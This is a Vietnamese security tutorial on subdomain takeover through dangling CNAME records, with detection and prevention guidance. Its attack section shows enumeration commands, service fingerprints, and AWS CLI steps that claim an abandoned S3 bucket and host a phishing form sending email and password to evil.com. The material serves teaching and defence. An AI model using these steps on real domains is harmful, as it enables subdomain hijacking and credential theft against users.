# Subdomain Takeover

> **CWE**: CWE-284 | **Phân loại**: Security Misconfiguration

## Kiến thức Nền tảng
Hãy tưởng tượng công ty của bạn thuê một gian hàng tại một trung tâm thương mại lớn để trưng bày sản phẩm. Để khách hàng dễ tìm đường, bạn đặt một biển chỉ dẫn lớn ở ngã tư ghi: "Gian hàng Đồ gia dụng của Công ty A: Đi thẳng vào Lô 12 trong trung tâm thương mại". Mọi việc diễn ra rất suôn sẻ. Sau một thời gian, công ty của bạn quyết định đóng cửa gian hàng này và trả lại mặt bằng Lô 12 cho trung tâm thương mại. Thế nhưng, nhân viên của bạn lại quên không đi gỡ bỏ biển chỉ dẫn ở ngã tư. Biển hiệu đó vẫn nằm trơ trọi ở đó, tiếp tục hướng dẫn khách hàng tìm đến Lô 12. 

Một kẻ xấu đi ngang qua, nhìn thấy Lô 12 hiện đang trống và biển chỉ dẫn vẫn còn hiệu lực. Hắn lập tức đến gặp ban quản lý trung tâm thương mại, thuê lại đúng Lô 12 này, trang trí nó giống hệt gian hàng cũ của bạn nhưng bên trong lại bán hàng giả, hàng nhái để lừa gạt những vị khách tin cậy đi theo biển chỉ dẫn. 

Trong thế giới mạng, sơ hở này xảy ra với hệ thống **DNS (Domain Name System)**. Các doanh nghiệp thường tạo các bản ghi **CNAME (Canonical Name)** để trỏ tên miền phụ của mình (ví dụ: `docs.company.com`) đến các dịch vụ lưu trữ đám mây bên thứ ba (như AWS S3, GitHub Pages, Heroku, Azure). Khi doanh nghiệp ngừng sử dụng dịch vụ đám mây đó (xóa bucket, xóa ứng dụng) nhưng lại quên xóa bản ghi CNAME tương ứng trong cấu hình DNS của mình, họ đã tạo ra một bản ghi "mồ côi" (dangling CNAME).

```bash
# Normal DNS configuration: subdomain points to cloud service
$ dig blog.company.com CNAME +short
company-blog.herokuapp.com

# DNS resolution chain:
# blog.company.com → CNAME → company-blog.herokuapp.com → A → 52.x.x.x
# Browser requests blog.company.com → gets content from Heroku app
```

```text
# Example DNS zone file for company.com
; Subdomain CNAME records pointing to external services
blog.company.com.       IN  CNAME  company-blog.herokuapp.com.
docs.company.com.       IN  CNAME  company-docs.s3-website-us-east-1.amazonaws.com.
status.company.com.     IN  CNAME  company.github.io.
landing.company.com.    IN  CNAME  company-landing.azurewebsites.net.
```

Quy trình hoạt động bình thường: DNS CNAME trỏ đến cloud service → cloud service nhận request → trả về nội dung hợp lệ. Tuy nhiên, vấn đề phát sinh khi tổ chức **ngừng sử dụng dịch vụ cloud** (xóa S3 bucket, unprovision Heroku app) nhưng **quên xóa bản ghi CNAME** trong DNS.

## Mô tả lỗ hổng
Lỗ hổng **Chiếm đoạt tên miền phụ** (Subdomain Takeover) xuất hiện chính từ những bản ghi DNS "mồ côi" này. Kẻ tấn công chỉ cần phát hiện ra một tên miền phụ của bạn đang trỏ về một dịch vụ đám mây không còn tồn tại (dangling CNAME). Kẻ tấn công sau đó sẽ đăng ký một tài khoản trên dịch vụ đám mây đó (ví dụ AWS S3 hoặc GitHub) và tạo một tài nguyên mới có tên trùng khớp hoàn toàn với tên hiển thị trong bản ghi CNAME cũ của bạn. Lúc này, bất kỳ ai truy cập vào tên miền phụ chính chủ của bạn đều sẽ được DNS dẫn thẳng đến trang web độc hại do kẻ tấn công kiểm soát. Lỗ hổng này cực kỳ nguy hiểm bởi vì trang web độc hại chạy dưới tên miền chính thức của công ty bạn, giúp kẻ tấn công dễ dàng thực hiện các chiến dịch lừa đảo (phishing), đánh cắp cookie đăng nhập nhạy cảm của người dùng, hoặc lách qua các chính sách bảo mật nghiêm ngặt (như CSP/CORS) để tấn công vào hệ thống ứng dụng chính.

## Cơ chế tấn công
**Bước 1: Phát hiện dangling CNAME**

```bash
# Enumerate subdomains using subfinder + httpx
subfinder -d company.com -silent | httpx -status-code -title -follow-redirects

# Check for dangling CNAME indicators
$ dig docs.company.com CNAME +short
company-docs.s3-website-us-east-1.amazonaws.com

$ curl -s https://docs.company.com
# Response: "404 Not Found — NoSuchBucket" ← S3 bucket deleted!
```

**Bước 2: Fingerprint dịch vụ bị bỏ rơi**

```text
# Common fingerprints for vulnerable services:
| Service        | CNAME Pattern                          | Error Signature                    |
|----------------|----------------------------------------|------------------------------------|
| AWS S3         | *.s3.amazonaws.com                     | "NoSuchBucket"                     |
| Heroku         | *.herokuapp.com                        | "No such app"                      |
| GitHub Pages   | *.github.io                            | "There isn't a GitHub Pages site"  |
| Azure          | *.azurewebsites.net                    | "404 Web Site not found"           |
| Shopify        | shops.myshopify.com                    | "Sorry, this shop is unavailable"  |
```

**Bước 3: Claim dịch vụ và chiếm subdomain**

```bash
# Example: Taking over an abandoned S3 bucket
# 1. Create S3 bucket with the EXACT name from the CNAME
aws s3 mb s3://company-docs --region us-east-1

# 2. Enable static website hosting
aws s3 website s3://company-docs \
  --index-document index.html

# 3. Upload malicious content
echo '<h1>Account Verification Required</h1>
<form action="https://evil.com/phish" method="POST">
  <input name="email" placeholder="Corporate Email">
  <input name="password" type="password" placeholder="Password">
  <button type="submit">Verify</button>
</form>' > index.html

aws s3 cp index.html s3://company-docs/ --acl public-read

# docs.company.com now serves attacker-controlled content!
```

## Biện pháp phòng thủ
- **Tóm tắt**: Phòng chống chiếm đoạt tên miền phụ bằng cách thực hiện vệ sinh DNS định kỳ, tự động hóa việc giám sát các bản ghi DNS rỗng, xác minh quyền sở hữu tên miền phụ và hạn chế phạm vi cookie.
- **Các bước chi tiết**:
  - **Vệ sinh DNS (DNS hygiene)**: thiết lập quy trình đánh giá — khi ngừng sử dụng một dịch vụ, hãy xóa bản ghi CNAME liên quan ngay lập tức.
  - **Giám sát tự động (Automated monitoring)**: sử dụng các công cụ như `subjack`, `nuclei` để quét các bản ghi CNAME trỏ rỗng định kỳ.
  - **Xác minh quyền sở hữu tên miền (Domain verification)**: sử dụng các tính năng xác minh qua bản ghi TXT được hỗ trợ bởi các nhà cung cấp dịch vụ (như GitHub Pages).
  - **Bảo vệ tên miền đại diện (Wildcard protection)**: tránh cấu hình DNS đại diện (`*.company.com`) trỏ đến các dịch vụ bên ngoài.
  - **Phạm vi hoạt động của cookie (Cookie scoping)**: không thiết lập cookie cho toàn bộ tên miền đại diện `*.company.com`, hãy sử dụng tiền tố `__Host-`.

## Code Example
```python
# === DETECTION SCRIPT: Scan for dangling CNAMEs ===
import dns.resolver
import requests

FINGERPRINTS = {
    "herokuapp.com": "No such app",
    "s3.amazonaws.com": "NoSuchBucket",
    "github.io": "There isn't a GitHub Pages site",
    "azurewebsites.net": "404 Web Site not found",
}

def check_subdomain(subdomain):
    """Check if a subdomain has a dangling CNAME"""
    try:
        # Resolve CNAME record
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname_target = str(answers[0].target).rstrip('.')

        # Check if CNAME points to a known vulnerable service
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname_target:
                try:
                    resp = requests.get(f"http://{subdomain}", timeout=5)
                    if fingerprint in resp.text:
                        return {
                            "subdomain": subdomain,
                            "cname": cname_target,
                            "service": service,
                            "status": "VULNERABLE",
                        }
                except requests.RequestException:
                    return {
                        "subdomain": subdomain,
                        "cname": cname_target,
                        "service": service,
                        "status": "POTENTIALLY_VULNERABLE",
                    }
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
        pass
    return {"subdomain": subdomain, "status": "SAFE"}


# === PREVENTION: Terraform DNS management ===
# Infrastructure-as-Code ensures DNS records are tied to resource lifecycle
# When the resource is destroyed, the CNAME is automatically removed

# resource "aws_s3_bucket" "docs" {
#   bucket = "company-docs"
# }
#
# resource "aws_route53_record" "docs_cname" {
#   zone_id = aws_route53_zone.main.zone_id
#   name    = "docs.company.com"
#   type    = "CNAME"
#   ttl     = 300
#   records = [aws_s3_bucket.docs.website_endpoint]
#   # When S3 bucket is destroyed, this DNS record is also destroyed
# }
```


## Xem thêm
- [Clickjacking](../clickjacking/) — Xem thêm bài học về Clickjacking.

## Nguồn tham khảo
- HackTricks: https://book.hacktricks.wiki/en/pentesting-web/domain-subdomain-takeover.html
- Can I Take Over XYZ: https://github.com/EdOverflow/can-i-take-over-xyz
- CWE-284: https://cwe.mitre.org/data/definitions/284.html

## Giải thích thuật ngữ
- **DNS (Domain Name System)**: Hệ thống phân giải tên miền, dịch chuyển các tên miền dễ đọc (như google.com) thành các địa chỉ IP của máy chủ.
- **CNAME Record**: Bản ghi tên miền chính tắc (Canonical Name), dùng để trỏ một tên miền phụ sang một tên miền khác thay vì trỏ trực tiếp đến địa chỉ IP.
- **Dangling CNAME**: Bản ghi CNAME mồ côi, xảy ra khi bản ghi DNS vẫn trỏ đến một tên miền đích của bên thứ ba nhưng tài nguyên đó đã bị xóa bỏ.
- **Subdomain Takeover**: Lỗ hổng bảo mật cho phép kẻ tấn công chiếm quyền kiểm soát một tên miền phụ hợp pháp bằng cách đăng ký lại tài nguyên bị bỏ rơi ở dịch vụ đích.
- **Phishing**: Tấn công lừa đảo người dùng nhằm chiếm đoạt thông tin đăng nhập hoặc dữ liệu nhạy cảm.
- **Cookie Theft**: Hành vi đánh cắp các tệp cookie lưu trên trình duyệt của người dùng để mạo danh phiên làm việc của họ.
- **Terraform**: Một công cụ quản lý cơ sở hạ tầng dưới dạng mã nguồn (Infrastructure as Code), giúp tự động hóa việc tạo lập và hủy bỏ các tài nguyên hệ thống (bao gồm cả bản ghi DNS).
